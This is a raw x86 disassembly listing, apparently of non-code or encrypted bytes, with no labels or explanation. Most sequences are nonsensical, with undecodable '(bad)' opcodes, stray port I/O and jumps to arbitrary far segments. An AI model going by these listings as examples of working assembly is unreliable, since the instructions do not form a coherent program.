  423d14:	neg    DWORD PTR [esi+0x52]
  423d17:	inc    edx
  423d18:	mov    eax,gs:0xe78875a0
  423d1e:	jns    0x423cfb
  423d20:	fs jle 0x423cac
  423d23:	mov    BYTE PTR [edx],bl
  423d25:	jne    0x423da0
  423d27:	push   es
  423d28:	add    ebx,DWORD PTR [esi-0x15]
  423d2b:	mov    al,0x6
  423d2d:	sti    
  423d2e:	sub    al,0x0
	...
  423d38:	add    BYTE PTR [eax],al
  423d3a:	clc    
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0xe57ffb2
  423d47:	mov    cs,WORD PTR [edi+eax*4]
  423d4a:	mov    edx,0xfd0001b6
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [eax+0x4a],ah
  423d54:	mov    esi,0x934d919c
  423d59:	pop    ebx
  423d5a:	cld    
  423d5b:	mov    ds:0x9672cec,eax
  423d60:	pusha  
  423d61:	sbb    DWORD PTR [eax+0x53],0x50b16177
  423d68:	mov    eax,ds:0x47c2ef36
  423d6d:	mov    eax,ds:0xa904a7ab
  423d72:	in     eax,dx
  423d73:	sti    
  423d74:	jmp    0xafff:0x126b2334
  423d7b:	cvtps2pi mm1,xmm7
  423d7e:	add    DWORD PTR [esi-0x1169b57b],ecx
  423d84:	stc    
  423d85:	imul   ebp,DWORD PTR [eax+ebx*8],0x8a2ef446
  423d8c:	fnstenv [esi-0x7b]
  423d8f:	inc    esi
  423d90:	cmp    BYTE PTR gs:[esp+edx*2],ah
  423d94:	jg     0x423d83
  423d96:	jle    0x423d55
  423d98:	in     al,0x8c
  423d9a:	gs jmp 0x423daa
  423d9d:	mov    bl,BYTE PTR [edx+0x1f]
  423da0:	test   DWORD PTR [ebx+0x567edce],ecx
  423da6:	push   0xffffffa2
  423da8:	retf   0xcab9
  423dab:	fcom   QWORD PTR [edi]
  423dad:	mov    edi,DWORD PTR [ecx+0x515264b5]
  423db3:	jae    0x423d4e
  423db5:	add    ebx,DWORD PTR [edx+eax*2+0x51783e2a]
  423dbc:	leave  
  423dbd:	sbb    ch,dl
  423dbf:	or     eax,0x8afc2a28
  423dc4:	fs mov dh,0x94
  423dc7:	and    al,0x64
  423dc9:	mov    cl,0x9e
  423dcb:	xor    al,0x49
  423dcd:	jne    0x423e10
  423dcf:	cmp    ch,BYTE PTR [edi+0x63cbe826]
  423dd5:	pop    ds
  423dd6:	xor    eax,0xf2e49841
  423ddb:	xor    eax,edx
  423ddd:	in     al,dx
  423dde:	fdiv   DWORD PTR [edx+0x15]
  423de1:	add    eax,0xe8875684
  423de6:	and    BYTE PTR [ebx],dl
  423de8:	aas    
  423de9:	mov    BYTE PTR [esi+0xcf7a7a],dh
  423def:	push   edx
  423df0:	je     0x423da9
  423df2:	inc    ebp
  423df3:	inc    ebp
  423df4:	test   BYTE PTR ds:0xb82b0e91,al
  423dfa:	mov    al,ds:0xd2fc9b73
  423dff:	in     al,0x45
  423e01:	mov    ch,0x47
  423e03:	ja     0x423dd8
  423e05:	sbb    ah,dh
  423e07:	addr16 add esp,eax
  423e0a:	lods   eax,DWORD PTR ds:[esi]
  423e0b:	stos   BYTE PTR es:[edi],al
  423e0c:	popa   
  423e0d:	push   ss
  423e0e:	inc    esp
  423e0f:	mov    ebp,edi
  423e11:	jg     0x423e8a
  423e13:	fs xor al,0xbc
  423e16:	sbb    DWORD PTR [edi-0x48b5793d],edx
  423e1c:	cmp    cl,BYTE PTR [edx+0x1c]
  423e1f:	add    dl,bh
  423e21:	xor    BYTE PTR [edx],cl
  423e23:	call   0x733b:0x3a2eb022
  423e2a:	pop    ecx
  423e2b:	sbb    BYTE PTR [ebx+0x1e1a3100],dh
  423e31:	cli    
  423e32:	xchg   edx,eax
  423e33:	repnz lods al,BYTE PTR ds:[esi]
  423e35:	adc    dh,BYTE PTR [eax+ecx*2-0x4e]
  423e39:	outs   dx,BYTE PTR ds:[esi]
  423e3a:	sbb    DWORD PTR [edx],edi
  423e3c:	bound  edx,QWORD PTR [esi]
  423e3e:	ins    BYTE PTR es:[edi],dx
  423e3f:	ficom  WORD PTR [ebp+0x6c]
  423e42:	push   esp
  423e43:	enter  0x27de,0x62
  423e47:	fisttp QWORD PTR [edi+0x5f]
  423e4a:	leave  
  423e4b:	push   cs
  423e4c:	push   edi
  423e4d:	es enter 0x43b4,0x40
  423e52:	inc    edx
  423e53:	adc    eax,0xe6972a8f
  423e58:	cmp    BYTE PTR [esi],ch
  423e5a:	bound  ebp,QWORD PTR [ebp-0x4144c8e6]
  423e60:	add    bl,al
  423e62:	or     DWORD PTR [edi],edi
  423e64:	or     cl,BYTE PTR [ecx-0x18]
  423e67:	(bad)  
  423e68:	mov    ss,WORD PTR [edx-0xb]
  423e6b:	jmp    0x423e3f
  423e6d:	mov    esi,0x96e11c9a
  423e72:	xchg   DWORD PTR [ecx-0x1],esp
  423e75:	clc    
  423e76:	fwait
  423e77:	jnp    0x423e9d
  423e79:	aaa    
  423e7a:	lds    esp,FWORD PTR [eax+0x520c8815]
  423e80:	push   esp
  423e81:	into   
  423e82:	repnz scas al,BYTE PTR es:[edi]
  423e84:	fldenv [ebx]
  423e86:	jg     0x423e6e
  423e88:	adc    al,BYTE PTR [eax]
  423e8a:	mov    esp,0x184d7ce0
  423e8f:	in     eax,dx
  423e90:	sahf   
  423e91:	and    DWORD PTR [ebp-0x41],eax
  423e94:	rcl    dh,0x14
  423e97:	adc    esp,DWORD PTR gs:[ebp-0x76]
  423e9b:	add    eax,0x5a71acc0
  423ea0:	inc    esi
  423ea1:	sbb    BYTE PTR [ecx-0x49],dh
  423ea4:	adc    al,0x5f
  423ea6:	call   0x7a00:0xd798ab96
  423ead:	adc    DWORD PTR [ebp-0x38d6bd66],0xffffff9f
  423eb4:	lds    esi,FWORD PTR [ebx]
  423eb6:	test   al,0xec
  423eb8:	(bad)  
  423eb9:	(bad)  
  423eba:	stos   BYTE PTR es:[edi],al
  423ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ebc:	jns    0x423f1d
  423ebe:	adc    al,0xf5
  423ec0:	mov    ds:0x7bf1b656,eax
  423ec5:	addr16 inc ax
  423ec8:	mov    ebp,0x4d346e85
  423ecd:	xchg   esi,eax
  423ece:	dec    edx
  423ecf:	mov    eax,0xd50ee77b
  423ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ed5:	pop    esp
  423ed6:	adc    BYTE PTR [esi-0x3e],dh
  423ed9:	mov    edx,0x8e93691a
  423ede:	sahf   
  423edf:	bound  esp,QWORD PTR [ebx+0x19a7b11f]
  423ee5:	mov    bh,cl
  423ee7:	jmp    0x4f9e:0xdfab4ea1
  423eee:	clc    
  423eef:	inc    esi
  423ef0:	cld    
  423ef1:	mov    al,ds:0x6cf352f
  423ef6:	jle    0x423e8e
  423ef8:	repnz inc edi
  423efa:	push   esp
  423efb:	in     eax,0x71
  423efd:	out    0x4c,eax
  423eff:	lock lock mov ebx,0x3fd1327d
  423f06:	out    dx,eax
  423f07:	ret    
  423f08:	and    BYTE PTR [ebx-0x3e618cb2],cl
  423f0e:	lea    edi,[eax+edi*8+0x49]
  423f12:	loop   0x423ee6
  423f14:	cld    
  423f15:	aaa    
  423f16:	jbe    0x423f85
  423f18:	adc    al,0xd4
  423f1a:	aam    0xab
  423f1c:	call   0x74a3:0x70ec8c77
  423f23:	in     eax,0x90
  423f25:	cwde   
  423f26:	push   0xc5c46df8
  423f2b:	pushf  
  423f2c:	ret    
  423f2d:	jecxz  0x423eda
  423f2f:	lock sub bh,bl
  423f32:	pop    edi
  423f33:	cmp    ch,0x0
  423f36:	fwait
  423f37:	mov    DWORD PTR [eax-0x78],edi
  423f3a:	fdivr  DWORD PTR [esi-0x5749e5fa]
  423f40:	jge    0x423ecd
  423f42:	adc    BYTE PTR [ebx+0x34],al
  423f45:	push   0x3c
  423f47:	mov    ecx,DWORD PTR [esi]
  423f49:	push   ebp
  423f4a:	repz add al,0xaf
  423f4d:	out    0xb2,eax
	...
  423f57:	add    BYTE PTR [eax],al
  423f59:	add    BYTE PTR [ecx],bh
  423f5b:	sbb    al,0x89
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0xd9e902b9
  423f67:	out    0x91,al
  423f69:	inc    esp
  423f6a:	mov    bh,0xb8
  423f6c:	add    DWORD PTR [eax],eax
  423f6e:	std    
  423f6f:	add    DWORD PTR [eax],eax
  423f71:	add    BYTE PTR [esi],bl
  423f73:	xchg   DWORD PTR [ebx],esp
  423f75:	sbb    DWORD PTR [ecx],0x3332ea37
  423f7b:	mov    dl,BYTE PTR [ebx-0x5d]
  423f7e:	mov    ebp,0xec3b2f70
  423f83:	aas    
  423f84:	aad    0x88
  423f86:	aad    0xa8
  423f88:	sahf   
  423f89:	xchg   esi,eax
  423f8a:	cli    
  423f8b:	mov    ecx,0x303f3028
  423f90:	inc    eax
  423f91:	pop    edi
  423f92:	sbb    BYTE PTR [esi],dl
  423f94:	xor    eax,0xc95c07af
  423f99:	pop    esp
  423f9a:	dec    eax
  423f9b:	sub    bh,BYTE PTR [ecx-0x33]
  423f9e:	mov    dl,0x7d
  423fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fa1:	add    ch,bl
  423fa3:	aas    
  423fa4:	adc    esp,DWORD PTR [eax+ebx*1-0x349366b2]
  423fab:	mov    ch,0xf8
  423fad:	out    dx,al
  423fae:	xor    eax,0xb6960b5
  423fb3:	or     esp,DWORD PTR [ebx-0x12ab398e]
  423fb9:	sahf   
  423fba:	inc    ecx
  423fbb:	mov    edi,0xdf52a827
  423fc0:	icebp  
  423fc1:	xlat   BYTE PTR ds:[ebx]
  423fc2:	jo     0x423fd1
  423fc4:	jmp    0x45c6:0xe408f170
  423fcb:	shl    BYTE PTR [ecx],cl
  423fcd:	pop    ss
  423fce:	push   ds
  423fcf:	lods   al,BYTE PTR ds:[esi]
  423fd0:	push   0xcffd58ad
  423fd5:	sti    
  423fd6:	cmp    DWORD PTR [ecx-0x38],0x59
  423fda:	xchg   esi,eax
  423fdb:	jmp    0x423f74
  423fdd:	in     eax,0x31
  423fdf:	push   ebx
  423fe0:	neg    DWORD PTR [eax-0x366dc378]
  423fe6:	jo     0x423fe3
  423fe8:	test   DWORD PTR ds:0x9a88c596,edx
  423fee:	cmp    BYTE PTR [esi+0x50],al
  423ff1:	ins    DWORD PTR es:[edi],dx
  423ff2:	in     al,0xe
  423ff4:	jge    0x42401c
  423ff6:	or     eax,DWORD PTR [ecx]
  423ff8:	out    dx,eax
  423ff9:	xor    cl,ah
  423ffb:	sub    eax,0x3bcbdb50
  424000:	retf   
  424001:	xchg   edx,eax
  424002:	jae    0x42401e
  424004:	pop    edx
  424005:	shr    DWORD PTR ss:0x9589e1e0,cl
  42400c:	xchg   BYTE PTR [edx],dh
  42400e:	push   ds
  42400f:	dec    ebp
  424010:	inc    ecx
  424011:	push   cs
  424012:	mov    ds:0x74a5be6c,al
  424017:	cmp    ah,BYTE PTR [esi-0x3b366342]
  42401d:	jne    0x424093
  42401f:	jo     0x424062
  424021:	jle    0x424047
  424023:	fisubr WORD PTR [ebp+0x795f19c5]
  424029:	hlt    
  42402a:	imul   eax,ebx,0x2c
  42402d:	jns    0x424056
  42402f:	mov    cl,0xcf
  424031:	arpl   WORD PTR [ebp+edx*2-0xb],ax
  424035:	fs jnp 0x42405c
  424038:	mov    eax,ds:0x8f614497
  42403d:	mov    esp,esi
  42403f:	cmp    DWORD PTR [eax-0x102da7dd],0x4e
  424046:	sti    
  424047:	scas   al,BYTE PTR es:[edi]
  424048:	and    DWORD PTR [ebx],ebx
  42404a:	lods   eax,DWORD PTR ds:[esi]
  42404b:	in     al,0x22
  42404d:	std    
  42404e:	retf   
  42404f:	inc    esi
  424050:	cmp    ah,BYTE PTR [eax-0x2ecb25d2]
  424056:	mov    DWORD PTR [eax+0x7df394cd],eax
  42405c:	ror    BYTE PTR [edi+0x7a],cl
  42405f:	mov    ecx,DWORD PTR [esi+0x3092f2c]
  424065:	(bad)  
  424067:	(bad)  
  424068:	out    0xaf,al
  42406a:	mov    al,0xaa
  42406c:	and    al,0x59
  42406e:	fstp   QWORD PTR [eax-0x39]
  424071:	pop    edi
  424072:	mov    esi,0x5e7f2087
  424077:	das    
  424078:	adc    BYTE PTR [ecx-0x72],dh
  42407b:	aas    
  42407c:	or     edx,ecx
  42407e:	aas    
  42407f:	int3   
  424080:	inc    esp
  424081:	jo     0x42404e
  424083:	inc    ecx
  424084:	xchg   esp,eax
  424085:	jno    0x4240f4
  424087:	jbe    0x42402a
  424089:	mov    bl,0xb
  42408b:	(bad)  
  42408c:	mov    bh,0x98
  42408e:	lods   al,BYTE PTR ds:[esi]
  42408f:	call   0x821a8677
  424094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424095:	(bad)  [ecx-0x77eb43be]
  42409b:	(bad)  [edx]
  42409d:	loope  0x42403f
  42409f:	pop    es
  4240a0:	sub    DWORD PTR [ebx+0x163d5595],0x5719dec8
  4240aa:	add    BYTE PTR [esi],cl
  4240ac:	mov    al,0xa9
  4240ae:	jecxz  0x4240b2
  4240b0:	lods   al,BYTE PTR ds:[esi]
  4240b1:	jecxz  0x424085
  4240b3:	mov    bl,BYTE PTR [edi+esi*1-0x11]
  4240b7:	jo     0x424070
  4240b9:	ja     0x424047
  4240bb:	inc    esp
  4240bc:	call   0x53ff2faa
  4240c1:	xchg   edx,eax
  4240c2:	xlat   BYTE PTR ds:[ebx]
  4240c3:	loope  0x424050
  4240c5:	mov    WORD PTR [edi+ebx*8+0xb],ds
  4240c9:	in     al,0x97
  4240cb:	test   cl,0xe2
  4240ce:	pusha  
  4240cf:	(bad)  
  4240d1:	jae    0x42405a
  4240d3:	cli    
  4240d4:	pop    eax
  4240d5:	dec    esi
  4240d6:	inc    ebx
  4240d7:	xchg   esp,eax
  4240d8:	or     bh,al
  4240da:	inc    edx
  4240db:	test   eax,0x5f6aea58
  4240e0:	mov    bl,0x93
  4240e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240e3:	dec    ebx
  4240e4:	retf   
  4240e5:	sbb    BYTE PTR [eax-0x4a],cl
  4240e8:	sbb    dl,BYTE PTR [ebp+0x2b]
  4240eb:	nop
  4240ec:	mov    DWORD PTR [esi-0x37],ecx
  4240ef:	or     esi,DWORD PTR [edi-0x62]
  4240f2:	ds dec edi
  4240f4:	mov    bl,0xe0
  4240f6:	das    
  4240f7:	and    al,0x75
  4240f9:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240fb:	cmp    DWORD PTR [ecx-0x5a],ebx
  4240fe:	dec    ebp
  4240ff:	mov    al,ds:0x10a1daf0
  424104:	sub    ebx,DWORD PTR [esi+0x76]
  424107:	xor    ch,ch
  424109:	enter  0x8e5f,0xbb
  42410d:	mov    cl,0xe8
  42410f:	push   0xbc359ff1
  424114:	adc    eax,0x18bdabd5
  424119:	jbe    0x424138
  42411b:	inc    ebp
  42411c:	and    BYTE PTR [eax-0x8],ah
  42411f:	push   eax
  424120:	jne    0x4240ea
  424122:	jmp    DWORD PTR [esi]
  424124:	adc    edx,DWORD PTR [ecx+0x71]
  424127:	leave  
  424128:	push   es
  424129:	icebp  
  42412a:	xchg   BYTE PTR [ebx-0x31578596],al
  424130:	ror    BYTE PTR [esi+0x76],cl
  424133:	aad    0x81
  424135:	(bad)  [eax+0x1aae34d5]
  42413b:	mov    ds,WORD PTR [esi]
  42413d:	sysenter 
  42413f:	mov    bh,0x16
  424141:	sar    DWORD PTR [ecx+0x36fa1b71],0xba
  424148:	retf   0xc80c
  42414b:	das    
  42414c:	xor    DWORD PTR [ecx+0x4d4214dc],esi
  424152:	add    cl,ah
  424154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424155:	or     al,0xd1
  424157:	and    BYTE PTR [esi+0x2b665539],0xf8
  42415e:	(bad)  
  424160:	call   0x370c:0x3f400b59
  424167:	fs lahf 
  424169:	inc    esp
  42416a:	dec    esi
  42416b:	mov    al,ds:0x5064e1
	...
  424178:	add    BYTE PTR [eax],al
  42417a:	gs mov ah,0x18
  42417d:	fcompp 
  42417f:	(bad)  
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	scas   eax,DWORD PTR es:[edi]
  424187:	fstp   DWORD PTR [esi-0x16]
  42418a:	mov    ah,0xba
  42418c:	add    DWORD PTR [eax],eax
  42418e:	std    
  42418f:	add    DWORD PTR [eax],eax
  424191:	add    BYTE PTR [ebp+0x25585088],ah
  424197:	sub    eax,0x71d12c61
  42419c:	ins    BYTE PTR es:[edi],dx
  42419d:	sub    DWORD PTR [eax],ecx
  42419f:	push   eax
  4241a0:	lds    edx,FWORD PTR [ebx-0x17dcc3c6]
  4241a6:	aam    0x26
  4241a8:	and    DWORD PTR ds:0xe0c657c3,0x5eb85bf8
  4241b2:	jbe    0x42419c
  4241b4:	sbb    cl,ch
  4241b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241b7:	jmp    0x47de:0x2e15d64f
  4241be:	daa    
  4241bf:	sub    bh,BYTE PTR [edi+esi*8+0x20]
  4241c3:	push   ss
  4241c4:	pushf  
  4241c5:	or     esi,DWORD PTR [ebx-0x13]
  4241c8:	dec    ecx
  4241c9:	adc    eax,DWORD PTR [esi-0x4d]
  4241cc:	loopne 0x424223
  4241ce:	or     eax,0x8e11fdfc
  4241d3:	inc    BYTE PTR [ebx-0x29]
  4241d6:	(bad)  
  4241d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241d8:	jns    0x424239
  4241da:	sbb    DWORD PTR [esi-0x4f],esi
  4241dd:	and    eax,0x60b8ebb2
  4241e2:	xchg   BYTE PTR [esp+eax*8],bh
  4241e5:	pusha  
  4241e6:	inc    ebp
  4241e7:	sub    DWORD PTR [ebx+0x40],0xffffffcc
  4241eb:	cdq    
  4241ec:	xchg   ebp,eax
  4241ed:	sbb    edx,0x68978af4
  4241f3:	mov    ds:0x42a518a9,al
  4241f8:	jmp    0x601b:0xbd114144
  4241ff:	jmp    0x2546:0x957983a
  424206:	mov    al,ds:0x64cf8157
  42420b:	rcr    esp,0xad
  42420e:	in     al,dx
  42420f:	fdiv   st,st(7)
  424211:	iret   
  424212:	call   0xf874:0x3ff9d01a
  424219:	jecxz  0x424234
  42421b:	adc    cl,BYTE PTR [eax+edi*4+0xdb6c8a3]
  424222:	imul   edi,DWORD PTR [eax],0xaa8d75b4
  424228:	jge    0x4242a3
  42422a:	cmp    DWORD PTR [edi],ebx
  42422c:	mov    dl,0x9a
  42422e:	inc    ebp
  42422f:	test   al,0xee
  424231:	push   ss
  424232:	es inc esp
  424234:	xor    ah,BYTE PTR [eax]
  424236:	mov    al,0xb
  424238:	mov    eax,0xccb34a58
  42423d:	ins    BYTE PTR es:[edi],dx
  42423e:	ins    DWORD PTR es:[edi],dx
  42423f:	jecxz  0x42429f
  424241:	jge    0x42420e
  424243:	mov    ebp,0xf22c1b52
  424248:	jle    0x4242a5
  42424a:	repnz test DWORD PTR [ecx-0x79278f2f],ebx
  424251:	sar    BYTE PTR [esp+edx*2],cl
  424254:	ins    DWORD PTR es:[edi],dx
  424255:	and    eax,0x650c8431
  42425a:	loop   0x424209
  42425c:	dec    DWORD PTR [ecx]
  42425e:	mov    ?,edx
  424260:	pop    ss
  424261:	lea    cx,[ecx-0x33f0de0e]
  424268:	div    bl
  42426a:	test   eax,0x940c0c0b
  42426f:	jecxz  0x42422b
  424271:	pop    ds
  424272:	cdq    
  424273:	je     0x4242ba
  424275:	and    ch,bh
  424277:	dec    ebp
  424278:	popf   
  424279:	out    0x84,al
  42427b:	mov    eax,ds:0x5237925a
  424280:	jne    0x424245
  424282:	jg     0x4242af
  424284:	adc    esp,DWORD PTR [eax]
  424286:	jns    0x424244
  424288:	pop    ebx
  424289:	test   eax,0xb84a4771
  42428e:	pop    esi
  42428f:	js     0x42428a
  424291:	cmc    
  424292:	add    ah,BYTE PTR [ebx+0x3a]
  424295:	fcom   st(7)
  424297:	pushf  
  424298:	ins    DWORD PTR es:[edi],dx
  424299:	stos   BYTE PTR es:[edi],al
  42429a:	inc    DWORD PTR [ebp+0x7b965de1]
  4242a0:	into   
  4242a1:	push   ss
  4242a2:	repnz mov DWORD PTR [ecx],ecx
  4242a5:	iret   
  4242a6:	pusha  
  4242a7:	mov    esi,0xa601437
  4242ac:	lods   eax,DWORD PTR ds:[esi]
  4242ad:	jb     0x424245
  4242af:	in     eax,dx
  4242b0:	mov    dl,0xe3
  4242b2:	sbb    BYTE PTR [edi+0x36b6560f],al
  4242b8:	xchg   ebx,eax
  4242b9:	cld    
  4242ba:	jmp    0xcdc23227
  4242bf:	popa   
  4242c0:	xor    BYTE PTR [edi+0x4c],0xc
  4242c4:	std    
  4242c5:	lods   al,BYTE PTR ds:[esi]
  4242c6:	push   edi
  4242c7:	idiv   DWORD PTR [ecx+0x47f96047]
  4242cd:	jno    0x42430e
  4242cf:	push   ebp
  4242d0:	ds cmp al,0x32
  4242d3:	inc    edx
  4242d4:	pop    ds
  4242d5:	xchg   esp,eax
  4242d6:	jl     0x4242c5
  4242d8:	jmp    0x233222df
  4242dd:	mov    esi,0x5e37857d
  4242e2:	add    ch,BYTE PTR [ecx+0x3a]
  4242e5:	dec    edx
  4242e6:	cmp    ah,BYTE PTR ds:0xfb09d51c
  4242ec:	sbb    ebp,DWORD PTR [edx+ebp*2+0x4f]
  4242f0:	test   al,0x3e
  4242f2:	cmp    DWORD PTR [edi-0x33],esp
  4242f5:	mov    al,0x8a
  4242f7:	mul    DWORD PTR [ebp-0x247ee35a]
  4242fd:	push   0xa88c8e05
  424302:	mov    dh,0x75
  424304:	adc    eax,0xdb6d579a
  424309:	scas   eax,DWORD PTR es:[edi]
  42430a:	mov    ah,0xfb
  42430c:	jno    0x4242c0
  42430e:	xchg   esi,eax
  42430f:	add    esi,DWORD PTR [esp+edi*2-0x30]
  424313:	inc    ax
  424315:	xor    al,0x95
  424317:	pop    ds
  424318:	cli    
  424319:	bound  ebp,QWORD PTR [ebp+0x726f67d]
  42431f:	scas   al,BYTE PTR es:[edi]
  424320:	mov    esi,0xe734234e
  424325:	xor    DWORD PTR [ebp+0x36a132fa],esi
  42432b:	mov    al,ds:0x7f57a2cb
  424330:	mov    esi,0xbda6edd6
  424335:	fst    QWORD PTR [eax]
  424337:	icebp  
  424338:	or     eax,0xe8b8944b
  42433d:	sbb    al,0x6d
  42433f:	aad    0xd3
  424341:	mov    ecx,0x602ce96c
  424346:	outs   dx,BYTE PTR ds:[esi]
  424347:	mov    dl,0x9f
  424349:	mov    eax,ds:0x376aaa22
  42434e:	fcmovu st,st(3)
  424350:	shl    DWORD PTR [ebp-0x3a8963a1],0x49
  424357:	jle    0x424364
  424359:	add    edi,DWORD PTR [ebx+0x726c3871]
  42435f:	in     al,0x23
  424361:	repnz and al,0x54
  424364:	dec    eax
  424365:	mov    BYTE PTR [eax-0x5406925e],bh
  42436b:	pop    eax
  42436c:	or     DWORD PTR [edx+esi*8-0x7b],0xffffffd1
  424371:	test   al,0x28
  424373:	leave  
  424374:	mov    eax,0x5f9cf13d
  424379:	jae    0x42438c
  42437b:	ss scas al,BYTE PTR es:[edi]
  42437d:	cmp    eax,DWORD PTR [ebp+ecx*1-0x5cb2e9dc]
  424384:	lock mov ss,WORD PTR [ebp-0x4b]
  424388:	xcrypt-cbc (bad)
  424389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42438a:	xlat   BYTE PTR ds:[ebx]
  42438b:	sub    bl,BYTE PTR [ebx+0x7dc2]
	...
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	or     BYTE PTR [esi],0x8
  4243a9:	arpl   WORD PTR [ecx-0x2fffe44],si
  4243af:	add    DWORD PTR [eax],eax
  4243b1:	add    BYTE PTR [edx],ah
  4243b3:	mov    ebx,ds
  4243b5:	leave  
  4243b6:	lahf   
  4243b7:	jg     0x4243b1
  4243b9:	inc    ecx
  4243ba:	jb     0x42435d
  4243bc:	sbb    ah,BYTE PTR [eax-0x4a880e62]
  4243c2:	jp     0x4243e7
  4243c4:	push   ds
  4243c5:	sbb    ebx,DWORD PTR [ebp-0x157a9e91]
  4243cb:	aaa    
  4243cc:	or     al,0x5d
  4243ce:	add    edi,DWORD PTR [ebx]
  4243d0:	neg    DWORD PTR [edx+0x3c]
  4243d3:	dec    edi
  4243d4:	je     0x4243f2
  4243d6:	pop    esi
  4243d7:	xor    al,0x98
  4243d9:	or     BYTE PTR [ebx+0x3d],bl
  4243dc:	call   0xc22e:0xa272622d
  4243e3:	mov    bl,0xc5
  4243e5:	and    ch,BYTE PTR [esi]
  4243e7:	sbb    al,0xdd
  4243e9:	jnp    0x4243ef
  4243eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243ec:	dec    eax
  4243ed:	dec    edi
  4243ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243ef:	scas   eax,DWORD PTR es:[edi]
  4243f0:	dec    edi
  4243f1:	(bad)  
  4243f3:	pop    ds
  4243f4:	dec    esp
  4243f5:	imul   edx,DWORD PTR [ebx+0x78e57501],0x7e1103e3
  4243ff:	icebp  
  424400:	pop    ebp
  424401:	cmp    BYTE PTR [ebx],0x7a
  424404:	stos   BYTE PTR es:[edi],al
  424405:	mov    ebx,0x1bfbe54f
  42440a:	pop    es
  42440b:	inc    edi
  42440c:	ror    BYTE PTR [esi-0xecb5f30],0xfd
  424413:	dec    ebp
  424414:	dec    eax
  424415:	mov    dh,0xf8
  424417:	fcmovnb st,st(3)
  424419:	adc    DWORD PTR [ebp-0x7690a0e],edx
  42441f:	dec    eax
  424420:	outs   dx,BYTE PTR ds:[esi]
  424421:	push   ecx
  424422:	and    al,ah
  424424:	sahf   
  424425:	stc    
  424426:	xchg   esi,eax
  424427:	adc    DWORD PTR [edx],0xc4f88e90
  42442d:	enter  0x40a1,0xf2
  424431:	cdq    
  424432:	and    dh,bh
  424434:	mov    esp,ebp
  424436:	jae    0x424481
  424438:	enter  0x78c5,0x46
  42443c:	jle    0x424456
  42443e:	cmp    DWORD PTR [esi-0x6b43cadc],0xef2bdd31
  424448:	fwait
  424449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42444a:	pop    esp
  42444b:	lea    ebp,[edx]
  42444d:	adc    bl,BYTE PTR [eax]
  42444f:	inc    ebx
  424450:	inc    edi
  424451:	int    0xcd
  424453:	pop    ebx
  424454:	adc    DWORD PTR [ebx+0x48],edi
  424457:	ins    BYTE PTR es:[edi],dx
  424458:	cdq    
  424459:	jnp    0x4244ab
  42445b:	and    esp,DWORD PTR [ebp-0x44]
  42445e:	data16 out dx,al
  424460:	sbb    BYTE PTR [edi+0xe],cl
  424463:	or     BYTE PTR [edx-0x60],ah
  424466:	out    dx,eax
  424467:	leave  
  424468:	ins    BYTE PTR es:[edi],dx
  424469:	or     BYTE PTR [ebx],dl
  42446b:	mov    dh,0xa6
  42446d:	stos   DWORD PTR es:[edi],eax
  42446e:	mov    ebp,0x9d6cfd34
  424473:	dec    ebp
  424474:	das    
  424475:	aaa    
  424476:	sbb    esp,ebp
  424478:	push   esp
  424479:	(bad)  
  42447a:	aad    0xea
  42447c:	fmul   QWORD PTR [ebx+esi*1-0x6c2bff5c]
  424483:	icebp  
  424484:	inc    edx
  424485:	dec    esi
  424486:	rol    BYTE PTR [esi-0x40],1
  424489:	repz sbb ah,BYTE PTR [edi-0x6f]
  42448d:	jmp    0x7bd8:0x30e4e5c0
  424494:	xchg   edi,eax
  424495:	and    ebp,ebp
  424497:	fstp   TBYTE PTR ds:0x35b7e9a4
  42449d:	(bad)  
  42449e:	adc    edi,DWORD PTR [ebp-0x3f]
  4244a1:	aam    0x73
  4244a3:	mov    esi,0xceadd350
  4244a8:	xchg   ecx,eax
  4244a9:	scas   al,BYTE PTR es:[edi]
  4244aa:	retf   
  4244ab:	mov    ecx,0xa3859df7
  4244b0:	add    eax,0x4e80f730
  4244b5:	(bad)  
  4244b6:	jmp    0x424491
  4244b8:	mov    al,0x21
  4244ba:	loope  0x424471
  4244bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244bd:	sbb    eax,0xb8bf6ef8
  4244c2:	inc    ebp
  4244c3:	into   
  4244c4:	pop    edi
  4244c5:	xor    DWORD PTR [edx+0x6a],ecx
  4244c8:	mov    al,ds:0xddba71c0
  4244cd:	idiv   DWORD PTR [eax]
  4244cf:	push   0x7e
  4244d1:	sti    
  4244d2:	jle    0x4244c2
  4244d4:	push   cs
  4244d5:	xchg   edx,eax
  4244d6:	les    ebx,FWORD PTR [eax+0x24381c44]
  4244dc:	adc    al,0xa
  4244de:	push   ss
  4244df:	loopne 0x4244ae
  4244e1:	cmp    eax,0xe39857e4
  4244e6:	sub    eax,DWORD PTR [edx-0x20]
  4244e9:	dec    ecx
  4244ea:	mov    eax,DWORD PTR [ecx+0x48267cfe]
  4244f0:	outs   dx,BYTE PTR ds:[esi]
  4244f1:	xor    al,0xe0
  4244f3:	sbb    BYTE PTR [eax],cl
  4244f5:	cmp    DWORD PTR [eax],eax
  4244f7:	add    eax,0x146cd1b3
  4244fc:	cli    
  4244fd:	in     al,0x6b
  4244ff:	test   eax,0xb8709e33
  424504:	pop    eax
